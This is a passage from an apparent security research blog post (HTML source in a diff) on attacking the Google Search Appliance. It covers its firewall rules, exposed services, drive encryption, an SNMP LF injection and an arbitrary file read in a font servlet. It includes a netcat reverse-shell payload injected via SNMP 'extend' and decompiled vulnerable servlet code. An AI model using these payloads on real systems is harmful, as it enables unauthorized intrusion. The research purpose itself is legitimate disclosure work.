+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The following summarizes the actual accessible TCP attack surface:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Port&lt;/th&gt;
+      &lt;th&gt;Service&lt;/th&gt;
+      &lt;th&gt;Program Location&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;ssh&lt;/td&gt;
+      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7800&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4430&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19900&lt;/td&gt;
+      &lt;td&gt;feedergate&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8000&lt;/td&gt;
+      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8443&lt;/td&gt;
+      &lt;td&gt;stunnel&lt;/td&gt;
+      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;And we found that the strings in file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; can be used to decrypt the content of all install bundles! 
+After gaining privileges using CVE-2014-6271 and decrypting the contents of the install bundle, 
+our research on vGSA has temporarily concluded.&lt;/p&gt;
+
+&lt;p&gt;But its lacks of memory protection might have some vulnerabilities that can be easily exploited.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;
+
+&lt;p&gt;Upon booting the installed appliance and attempting to change the boot sequence,
+we found that a password is required to enter the BIOS. 
+Moreover, only some functions are accessible in the management interface of the Dell H700 RAID card:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, attempt to directly read the contents of the hard drive. 
+If the hard drive content is not encrypted, there is a chance that the device’s operating system and software can be obtained directly.
+We found that its hard drive uses SAS interface for transmission. 
+Before attempting, it is necessary to purchase a SAS HBA card. The LSI 9211-8i is used for connection in this test:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After connecting and attempting to read, it was discovered that this is a Self-Encrypting Drive (SED). 
+It requires a password to unlock for access. OSSLab has a more detailed explanation here:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (chinese article)&lt;/p&gt;
+
+&lt;p&gt;There are several ways to continue trying when the hard drive cannot be directly accessed:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Try to read the password in the BIOS EEPROM and change the boot order.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This method requires damage to the motherboard and carries some risk. 
+This method is only used when no vulnerabilities can be found at the software level.
+More information: &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Use PCILeech to read, write memory to gain system privileges.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This method requires specific PCI-e devices, which were not prepared at the time. You can refer to this GitHub project：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Look for software vulnerabilities that can access the service&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This method is simpler and more feasible.&lt;/p&gt;
+
+&lt;h4 id=&quot;lf-injection-in-admin-console&quot;&gt;LF injection in Admin Console&lt;/h4&gt;
+
+&lt;p&gt;After logging into the admin console, 
+we observed a feature for obtaining system information through SNMP.
+Additionally, this feature allows the insertion of custom strings.：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We tried classic LF injection here：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Inject &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysContact&lt;/code&gt; with a LF and following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After inserting the configuration value “extend”, 
+we can use the command “snmpwalk” to trigger the SNMP’s extend functionality and execute a shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Command executed successfully, and connected back with a shell.&lt;/p&gt;
+
+&lt;h4 id=&quot;arbitrary-file-reading&quot;&gt;Arbitrary File Reading&lt;/h4&gt;
+
+&lt;p&gt;From GSA 6.x series versions, we found that the 80/443 web services use Apache httpd in the RPM installation package. 
+There are several http configurations located in /etc/httpd/conf.d/. 
+In the files gsa-http.conf and gsaa-https.conf, certain directories are redirected to specific local services.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
+  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
+  RewriteRule ^/d██████████/(.*) http://localhost:7890/dps/d██████████/$1 [P,L]
+  RewriteRule ^/s██████/(.*) http://localhost:7890/dps/s██████/$1 [P,L]
+  RewriteRule ^/v█████/(.*) http://localhost:7890/v█████/$1 [P,L]
+  RewriteRule ^/$ http://localhost:7800/ [P,L]
+  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The communication ports 7886 and 7890 are services run by separate Apache Tomcat servers. 
+When proxying two or more web servers, the path determination of Tomcat, ..;/, 
+is an interesting test point. You can refer to the article written by our employee for more details:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The point we’re interested in is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dps&lt;/code&gt;, which doesn’t seem to be present in the old version of GSA. 
+Extracting /WEB-INF/web.xml from dps.war allows us to inspect the web application configuration, and we’ve found that the endpoint of /font will handled by
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
+
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And looking into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Step into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt; which extends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
